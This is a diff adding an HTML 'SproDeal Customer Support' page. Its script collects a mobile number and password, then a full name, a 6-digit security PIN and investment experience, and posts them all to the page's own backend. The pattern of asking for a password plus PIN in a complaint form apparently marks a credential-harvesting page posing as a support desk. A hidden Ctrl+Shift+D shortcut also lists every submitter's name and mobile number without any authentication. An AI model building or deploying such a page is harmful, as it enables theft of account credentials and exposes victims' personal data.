@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SproDeal Customer Support</title>
+    <link rel="stylesheet" href="/https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f8f9fa;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #333;
+        }
+        
+        /* Top Logo Section */
+        .logo-section {
+            background-color: white;
+            padding: 25px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* .logo-circle {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #68b941 0%, #5aa835 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            box-shadow: 0 6px 15px rgba(104, 185, 65, 0.3);
+            border: 4px solid white;
+            outline: 1px solid #e1e5eb;
+        } */
+        
+        /* .logo-circle span {
+            font-size: 32px;
+            font-weight: 800;
+            color: white;
+            letter-spacing: 1px;
+        } */
+        
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 5px;
+        }
+        
+        .logo-text .main-title {
+            font-size: 36px;
+            font-weight: 800;
+            color: #333;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+        
+        .logo-text .subtitle {
+            font-size: 16px;
+            color: #68b941;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+        
+        /* Page Container */
+        .page-container {
+            display: flex;
+            flex: 1;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+        }
+        
+        /* Login Page Styles */
+        #loginPage {
+            display: flex;
+        }
+        
+        .login-card {
+            background-color: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            text-align: center;
+            border-top: 5px solid #68b941;
+            position: relative;
+            overflow: hidden;
+            margin-top: -20px;
+        }
+        
+        .login-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: #68b941;
+        }
+        
+        .login-header {
+            margin-bottom: 30px;
+        }
+        
+        .login-header h1 {
+            color: #68b941;
+            font-size: 32px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        
+        .login-header p {
+            color: #666;
+            font-size: 16px;
+            font-weight: 400;
+        }
+        
+        /* Verification Page Styles */
+        #verificationPage {
+            display: none;
+        }
+        
+        .verification-card {
+            background-color: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 600px;
+            padding: 40px;
+            border-top: 5px solid #68b941;
+            position: relative;
+            overflow: hidden;
+            margin-top: -20px;
+        }
+        
+        .verification-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: #68b941;
+        }
+        
+        .verification-header {
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .verification-header h1 {
+            color: #68b941;
+            font-size: 32px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        
+        .verification-header h2 {
+            color: #333;
+            font-size: 24px;
+            margin: 20px 0 10px;
+            font-weight: 600;
+            text-align: left;
+        }
+        
+        .verification-header p {
+            color: #666;
+            font-size: 16px;
+            font-weight: 400;
+        }
+        
+        /* Form Styles */
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 15px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #e1e5eb;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background-color: #f8f9fa;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #68b941;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(104, 185, 65, 0.1);
+        }
+        
+        select.input-field {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23333' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 20px center;
+            background-size: 16px;
+            padding-right: 50px;
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 18px;
+        }
+        
+        .pin-container {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+        
+        .pin-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 2px solid #e1e5eb;
+            border-radius: 8px;
+            background-color: #f8f9fa;
+            transition: all 0.3s;
+        }
+        
+        .pin-input:focus {
+            outline: none;
+            border-color: #68b941;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(104, 185, 65, 0.1);
+        }
+        
+        .submit-button {
+            background-color: #68b941;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            margin-top: 20px;
+            letter-spacing: 0.5px;
+        }
+        
+        .submit-button:hover {
+            background-color: #5aa835;
+            transform: translateY(-2px);
+            box-shadow: 0 7px 15px rgba(104, 185, 65, 0.2);
+        }
+        
+        .submit-button:active {
+            transform: translateY(0);
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 25px;
+            color: #666;
+            font-size: 14px;
+            background-color: #f1f3f5;
+            border-top: 1px solid #e1e5eb;
+        }
+        
+        .footer a {
+            color: #68b941;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Success Popup */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .popup {
+            background-color: white;
+            border-radius: 16px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
+            border-top: 5px solid #68b941;
+            animation: popupIn 0.3s ease-out;
+        }
+        
+        @keyframes popupIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .popup-icon {
+            font-size: 60px;
+            color: #68b941;
+            margin-bottom: 20px;
+        }
+        
+        .popup h2 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .popup p {
+            color: #666;
+            font-size: 18px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .popup-button {
+            background-color: #68b941;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .popup-button:hover {
+            background-color: #5aa835;
+            transform: translateY(-2px);
+            box-shadow: 0 7px 15px rgba(104, 185, 65, 0.2);
+        }
+        
+        /* Loading Indicator */
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+            color: #68b941;
+            font-weight: 500;
+        }
+        
+        .loading i {
+            margin-right: 10px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .logo-section {
+                padding: 20px 0;
+            }
+            
+          
+            
+            .logo-text .main-title {
+                font-size: 32px;
+            }
+            
+            .login-card, .verification-card {
+                padding: 30px 25px;
+                margin-top: -10px;
+            }
+            
+            .login-header h1, .verification-header h1 {
+                font-size: 28px;
+            }
+            
+            .verification-header h2 {
+                font-size: 22px;
+            }
+            
+            .pin-container {
+                gap: 10px;
+            }
+            
+            .pin-input {
+                width: 45px;
+                height: 55px;
+                font-size: 22px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .logo-text .main-title {
+                font-size: 28px;
+            }
+            
+            .logo-text .subtitle {
+                font-size: 14px;
+            }
+            
+            .login-card, .verification-card {
+                padding: 25px 20px;
+                margin-top: 0;
+            }
+            
+            .login-header h1, .verification-header h1 {
+                font-size: 24px;
+            }
+            
+            .verification-header h2 {
+                font-size: 20px;
+            }
+            
+            .input-field {
+                padding: 14px 16px;
+            }
+            
+            .pin-container {
+                gap: 8px;
+            }
+            
+            .pin-input {
+                width: 40px;
+                height: 50px;
+                font-size: 20px;
+            }
+            
+            .popup {
+                padding: 30px 20px;
+            }
+            
+            .popup h2 {
+                font-size: 24px;
+            }
+            
+            .popup p {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Logo Section -->
+    <div class="logo-section">
+        <div class="logo-circle">
+            <img src="C:\Users\akash\OneDrive\Desktop\Spro Deal Customer Service\backend\public\WhatsApp Image 2025-09-16 at 20.05.09_850fcfa8-fotor-2026012018322.png" style="width: 120px; border-radius: 10px;">
+        </div>
+        <div class="logo-text">
+            <div class="main-title">Spro Deal Customer Support </div>
+            <div class="subtitle"></div>
+        </div>
+    </div>
+    
+    <!-- Login Page -->
+    <div class="page-container" id="loginPage">
+        <div class="login-card">
+            <div class="login-header">
+                <h1>LOG IN</h1>
+                <p>Access your SproDeal customer support account</p>
+            </div>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="mobile">Enter Mobile Number</label>
+                    <input type="tel" id="mobile" class="input-field" placeholder="+91 98765 43210" required>
+                    <!-- <div class="format-indicator">Format: +91 followed by 10-digit Indian mobile number</div> -->
+                </div>
+                
+                <div class="input-group">
+                    <label for="password">Enter Password</label>
+                    <div class="password-container">
+                        <input type="password" id="password" class="input-field" placeholder="Enter your password" required>
+                        <button type="button" class="toggle-password" id="togglePassword">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="loading" id="loginLoading">
+                    <i class="fas fa-spinner"></i> Authenticating...
+                </div>
+                
+                <button type="submit" class="submit-button" id="loginButton">LOG IN</button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Verification Page -->
+    <div class="page-container" id="verificationPage">
+        <div class="verification-card">
+            <div class="verification-header">
+                <h1>SproDeal Customer Support</h1>
+                <p>Please complete your verification</p>
+                <h2>Verification Details</h2>
+            </div>
+            
+            <form id="verificationForm">
+                <div class="input-group">
+                    <label for="fullName">Full Name</label>
+                    <input type="text" id="fullName" class="input-field" placeholder="Enter your full name" required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="problemType">Problem Type</label>
+                    <select id="problemType" class="input-field" required>
+                        <option value="" disabled selected>Select your problem</option>
+                        <option value="account">ID Auto Logout</option>
+                        <option value="payment">Payment Pending </option>
+                        <option value="technical">Slow Sell</option>
+                        <option value="investment">Quota Not Added</option>
+                        <option value="other">Tool Auto Deauthorized</option>
+                        <!-- <option value="account">Account Issue</option>
+                        <option value="payment">Payment Problem</option>
+                        <option value="technical">Technical Issue</option>
+                        <option value="investment">Investment Query</option>
+                        <option value="other">Other</option> -->
+
+                    </select>
+                </div>
+                
+                <div class="input-group">
+                    <label for="securityPin">Security PIN (6 digits)</label>
+                    <p style="font-size: 14px; color: #666; margin-bottom: 10px;">Please enter a 6-digit PIN</p>
+                    <div class="pin-container" id="pinContainer">
+                        <input type="text" class="pin-input" maxlength="1" data-index="1" required>
+                        <input type="text" class="pin-input" maxlength="1" data-index="2" required>
+                        <input type="text" class="pin-input" maxlength="1" data-index="3" required>
+                        <input type="text" class="pin-input" maxlength="1" data-index="4" required>
+                        <input type="text" class="pin-input" maxlength="1" data-index="5" required>
+                        <input type="text" class="pin-input" maxlength="1" data-index="6" required>
+                    </div>
+                    <input type="hidden" id="securityPin" required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="investmentExperience">Investment Experience</label>
+                    <select id="investmentExperience" class="input-field" required>
+                        <option value="" disabled selected>Select experience level</option>
+                        <option value="beginner">Beginner (Less than 1 year)</option>
+                        <option value="intermediate">Intermediate (1-3 years)</option>
+                        <option value="experienced">Experienced (3-5 years)</option>
+                        <option value="expert">Expert (More than 5 years)</option>
+                    </select>
+                </div>
+                
+                <div class="loading" id="submitLoading">
+                    <i class="fas fa-spinner"></i> Submitting your complaint...
+                </div>
+                
+                <button type="submit" class="submit-button" id="submitButton">Submit Verification</button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Success Popup -->
+    <div class="popup-overlay" id="successPopup">
+        <div class="popup">
+            <div class="popup-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Verification Successful!</h2>
+            <p id="popupMessage">You have successfully submitted your complaint. Your complaint has been registered successfully. Our support team will contact you shortly.</p>
+            <div id="complaintDetails" style="text-align: left; margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; display: none;">
+                <h3 style="color: #68b941; margin-bottom: 10px;">Complaint Details:</h3>
+                <p><strong>Complaint ID:</strong> <span id="detailId"></span></p>
+                <p><strong>Full Name:</strong> <span id="detailName"></span></p>
+                <p><strong>Problem Type:</strong> <span id="detailProblem"></span></p>
+                <p><strong>Submitted At:</strong> <span id="detailTime"></span></p>
+            </div>
+            <button class="popup-button" id="closePopup">OK</button>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="footer">
+        <p>&copy; 2023 SproDeal Customer Support. All rights reserved. | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+        <p>Need help? Contact our support team at <a href="mailto:support@sprodeal.com">support@sprodeal.com</a></p>
+        <p style="margin-top: 10px; font-size: 12px; color: #888;">Backend: <span id="backendStatus" style="color: #68b941;">Connecting...</span></p>
+    </div>
+    
+    <script>
+        // API Configuration
+       const API_BASE_URL = '/api';
+        let currentUserId = null;
+        
+        // Check backend connection on page load
+        window.addEventListener('DOMContentLoaded', () => {
+            checkBackendConnection();
+            mobileInput.focus();
+        });
+        
+        // Backend Connection Check
+        async function checkBackendConnection() {
+            try {
+                const response = await fetch(`${API_BASE_URL}/test`);
+                const data = await response.json();
+                
+                if (data.message === 'Backend is working!') {
+                    document.getElementById('backendStatus').textContent = 'Connected ✓';
+                    document.getElementById('backendStatus').style.color = '#68b941';
+                    console.log('✅ Backend connected successfully');
+                }
+            } catch (error) {
+                document.getElementById('backendStatus').textContent = 'Disconnected ✗';
+                document.getElementById('backendStatus').style.color = '#ff4444';
+                console.error('❌ Backend connection failed:', error);
+                alert('Warning: Backend server is not running. Please start the server to save data.');
+            }
+        }
+        
+        // Toggle password visibility
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+        
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            
+            // Toggle eye icon
+            const icon = this.querySelector('i');
+            if (type === 'password') {
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            } else {
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            }
+        });
+        
+        // Format mobile number as Indian number (+91 format)
+        const mobileInput = document.getElementById('mobile');
+        
+        mobileInput.addEventListener('input', function() {
+            // Remove all non-digit characters except the plus sign at the beginning
+            let value = this.value;
+            
+            // If it doesn't start with +91, automatically add it
+            if (!value.startsWith('+91')) {
+                value = '+91 ' + value.replace(/\D/g, '');
+            } else {
+                // Keep +91 and only digits after it
+                const prefix = '+91 ';
+                const digits = value.substring(prefix.length).replace(/\D/g, '');
+                value = prefix + digits;
+            }
+            
+            // Format the number with spaces for readability
+            const digitsOnly = value.substring(4).replace(/\D/g, '');
+            
+            if (digitsOnly.length <= 5) {
+                value = '+91 ' + digitsOnly;
+            } else if (digitsOnly.length <= 10) {
+                value = '+91 ' + digitsOnly.substring(0, 5) + ' ' + digitsOnly.substring(5);
+            } else {
+                // Limit to 10 digits after +91
+                value = '+91 ' + digitsOnly.substring(0, 5) + ' ' + digitsOnly.substring(5, 10);
+            }
+            
+            this.value = value;
+        });
+        
+        // PIN Input Handling
+        const pinInputs = document.querySelectorAll('.pin-input');
+        const securityPinInput = document.getElementById('securityPin');
+        
+        pinInputs.forEach(input => {
+            input.addEventListener('input', function() {
+                const index = parseInt(this.getAttribute('data-index'));
+                
+                // Only allow numbers
+                this.value = this.value.replace(/\D/g, '');
+                
+                // Move to next input if current is filled
+                if (this.value.length === 1 && index < 6) {
+                    pinInputs[index].focus();
+                }
+                
+                // Update hidden security PIN field
+                updateSecurityPin();
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                const index = parseInt(this.getAttribute('data-index'));
+                
+                // Handle backspace
+                if (e.key === 'Backspace' && this.value === '' && index > 1) {
+                    pinInputs[index - 2].focus();
+                }
+                
+                // Handle arrow keys
+                if (e.key === 'ArrowLeft' && index > 1) {
+                    pinInputs[index - 2].focus();
+                }
+                
+                if (e.key === 'ArrowRight' && index < 6) {
+                    pinInputs[index].focus();
+                }
+            });
+        });
+        
+        function updateSecurityPin() {
+            let pin = '';
+            pinInputs.forEach(input => {
+                pin += input.value;
+            });
+            securityPinInput.value = pin;
+        }
+        
+        // Login Form Submission - USING REAL BACKEND API
+        const loginForm = document.getElementById('loginForm');
+        const loginPage = document.getElementById('loginPage');
+        const verificationPage = document.getElementById('verificationPage');
+        const loginButton = document.getElementById('loginButton');
+        const loginLoading = document.getElementById('loginLoading');
+        
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const mobile = document.getElementById('mobile').value;
+            const password = document.getElementById('password').value;
+            
+            // Simple validation
+            if (!mobile || !password) {
+                alert('Please enter both mobile number and password.');
+                return;
+            }
+            
+            // Validate Indian mobile number format
+            const mobileRegex = /^\+91\s?\d{5}\s?\d{5}$/;
+            if (!mobileRegex.test(mobile)) {
+                alert('Please enter a valid Indian mobile number in the format: +91 XXXXX XXXXX');
+                return;
+            }
+            
+            // Show loading
+            loginButton.style.display = 'none';
+            loginLoading.style.display = 'block';
+            
+            try {
+                // Send login request to backend
+                const response = await fetch(`${API_BASE_URL}/login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        mobile: mobile,
+                        password: password
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Store user ID for later use
+                    currentUserId = data.userId;
+                    
+                    // Switch to verification page
+                    loginPage.style.display = 'none';
+                    verificationPage.style.display = 'flex';
+                    
+                    // Auto-focus on first field of verification form
+                    document.getElementById('fullName').focus();
+                    
+                    console.log('✅ Login successful. User ID:', currentUserId);
+                } else {
+                    alert('Login failed: ' + data.message);
+                }
+            } catch (error) {
+                console.error('Login error:', error);
+                alert('Login failed. Please check if backend server is running.');
+            } finally {
+                // Hide loading
+                loginButton.style.display = 'block';
+                loginLoading.style.display = 'none';
+            }
+        });
+        
+        // Verification Form Submission - USING REAL BACKEND API
+        const verificationForm = document.getElementById('verificationForm');
+        const successPopup = document.getElementById('successPopup');
+        const submitButton = document.getElementById('submitButton');
+        const submitLoading = document.getElementById('submitLoading');
+        
+        verificationForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const fullName = document.getElementById('fullName').value;
+            const problemType = document.getElementById('problemType').value;
+            const securityPin = securityPinInput.value;
+            const investmentExperience = document.getElementById('investmentExperience').value;
+            
+            // Validate all fields
+            if (!fullName || !problemType || !investmentExperience) {
+                alert('Please fill in all required fields.');
+                return;
+            }
+            
+            // Validate PIN length
+            if (securityPin.length !== 6) {
+                alert('Please enter a 6-digit security PIN.');
+                // Focus on first PIN input
+                pinInputs[0].focus();
+                return;
+            }
+            
+            // Show loading
+            submitButton.style.display = 'none';
+            submitLoading.style.display = 'block';
+            
+            try {
+                // Send complaint submission to backend
+                const response = await fetch(`${API_BASE_URL}/submit-complaint`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        userId: currentUserId,
+                        fullName: fullName,
+                        problemType: problemType,
+                        securityPin: securityPin,
+                        investmentExperience: investmentExperience
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Show success popup with details
+                    document.getElementById('popupMessage').textContent = 
+                        `Complaint submitted successfully! Complaint ID: ${data.complaintId}`;
+                    
+                    // Show complaint details
+                    document.getElementById('detailId').textContent = data.complaintId;
+                    document.getElementById('detailName').textContent = fullName;
+                    document.getElementById('detailProblem').textContent = problemType;
+                    document.getElementById('detailTime').textContent = new Date().toLocaleString();
+                    document.getElementById('complaintDetails').style.display = 'block';
+                    
+                    successPopup.style.display = 'flex';
+                    
+                    console.log('✅ Complaint submitted. ID:', data.complaintId);
+                } else {
+                    alert('Submission failed: ' + data.message);
+                }
+            } catch (error) {
+                console.error('Submission error:', error);
+                alert('Submission failed. Please check if backend server is running.');
+            } finally {
+                // Hide loading
+                submitButton.style.display = 'block';
+                submitLoading.style.display = 'none';
+            }
+        });
+        
+        // Close Popup
+        const closePopup = document.getElementById('closePopup');
+        closePopup.addEventListener('click', function() {
+            successPopup.style.display = 'none';
+            
+            // Reset verification form
+            verificationForm.reset();
+            
+            // Reset PIN inputs
+            pinInputs.forEach(input => {
+                input.value = '';
+            });
+            securityPinInput.value = '';
+            
+            // Hide complaint details
+            document.getElementById('complaintDetails').style.display = 'none';
+            
+            // Switch back to login page
+            verificationPage.style.display = 'none';
+            loginPage.style.display = 'flex';
+            
+            // Reset login form
+            loginForm.reset();
+            
+            // Clear user ID
+            currentUserId = null;
+            
+            // Auto-focus on mobile input
+            mobileInput.focus();
+        });
+        
+        // Add keyboard shortcut for testing (Ctrl+Shift+D to view data)
+        document.addEventListener('keydown', async function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                e.preventDefault();
+                try {
+                    const response = await fetch(`${API_BASE_URL}/complaints`);
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        let message = `Total Complaints: ${data.complaints.length}\n\n`;
+                        data.complaints.forEach((complaint, index) => {
+                            message += `${index + 1}. ${complaint.full_name} - ${complaint.problem_type} (Mobile: ${complaint.mobile_number})\n`;
+                        });
+                        alert(message);
+                    }
+                } catch (error) {
+                    console.error('Error fetching complaints:', error);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
